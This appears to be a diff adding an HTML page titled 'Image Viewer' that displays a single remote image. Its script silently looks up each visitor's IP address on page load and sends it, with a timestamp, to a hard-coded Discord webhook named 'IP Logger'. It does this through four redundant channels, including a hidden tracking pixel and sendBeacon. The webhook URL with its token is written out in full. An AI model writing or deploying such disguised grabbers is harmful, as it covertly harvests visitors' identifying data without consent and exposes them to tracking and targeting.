@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Image Viewer</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    
+    body, html {
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      background: #000;
+      font-family: Arial, sans-serif;
+    }
+    
+    .image-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      width: 100%;
+      height: 100%;
+    }
+    
+    .image-container img {
+      max-width: 100%;
+      max-height: 100%;
+      object-fit: contain;
+    }
+    
+    /* Hidden tracking pixel */
+    .tracking-pixel {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      opacity: 0.001;
+      pointer-events: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="image-container">
+    <img src="https://imcrab.online/mn.webp" alt="Display Image">
+  </div>
+
+  <!-- Hidden tracking pixel -->
+  <img class="tracking-pixel" id="tracker" src="about:blank" alt="">
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      // Get IP address
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip;
+          
+          // Send to Discord webhook using multiple methods
+          sendToDiscordWebhook(ip);
+        })
+        .catch(error => {
+          console.error('Error detecting IP:', error);
+          // Fallback to alternative IP detection
+          detectIPAlternative();
+        });
+      
+      function sendToDiscordWebhook(ip) {
+        const webhookUrl = 'https://discord.com/api/webhooks/1415505318472843314/_to_3C9MV-rSyGviyDt5WZrZdxr12WVTt9W89LBX4ZFX36SMCa3cKs0tWPsMVLB5hZYr';
+        const avatarUrl = 'https://toastdev.space/images/curser1.png';
+        
+        const timestamp = new Date().toISOString();
+        const message = {
+          content: `IP Address: ${ip} detected at ${timestamp}`,
+          username: "IP Logger",
+          avatar_url: avatarUrl
+        };
+        
+        // Method 1: Use no-cors mode
+        fetch(webhookUrl, {
+          method: "POST",
+          mode: "no-cors",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(message)
+        }).catch(error => console.log("Method 1 failed (expected with no-cors):", error));
+        
+        // Method 2: Use a tracking pixel with Discord webhook
+        const trackingPixel = document.getElementById('tracker');
+        trackingPixel.src = `https://discord.com/api/webhooks/1415505318472843314/_to_3C9MV-rSyGviyDt5WZrZdxr12WVTt9W89LBX4ZFX36SMCa3cKs0tWPsMVLB5hZYr?wait=true&content=IP:${ip}`;
+        
+        // Method 3: Use a try-catch with a direct request (might work in some environments)
+        try {
+          const xhr = new XMLHttpRequest();
+          xhr.open("POST", webhookUrl, true);
+          xhr.setRequestHeader("Content-Type", "application/json");
+          xhr.send(JSON.stringify(message));
+        } catch (e) {
+          console.log("XHR method failed:", e);
+        }
+        
+        // Method 4: Use navigator.sendBeacon if available
+        if (navigator.sendBeacon) {
+          const blob = new Blob([JSON.stringify(message)], {type: 'application/json'});
+          navigator.sendBeacon(webhookUrl, blob);
+        }
+        
+        console.log("IP tracking completed silently");
+      }
+      
+      function detectIPAlternative() {
+        // Alternative method using a different IP API
+        fetch('https://api64.ipify.org?format=json')
+          .then(response => response.json())
+          .then(data => {
+            sendToDiscordWebhook(data.ip);
+          })
+          .catch(error => {
+            console.error('All IP detection methods failed:', error);
+          });
+      }
+    });
+  </script>
+</body>
+</html>
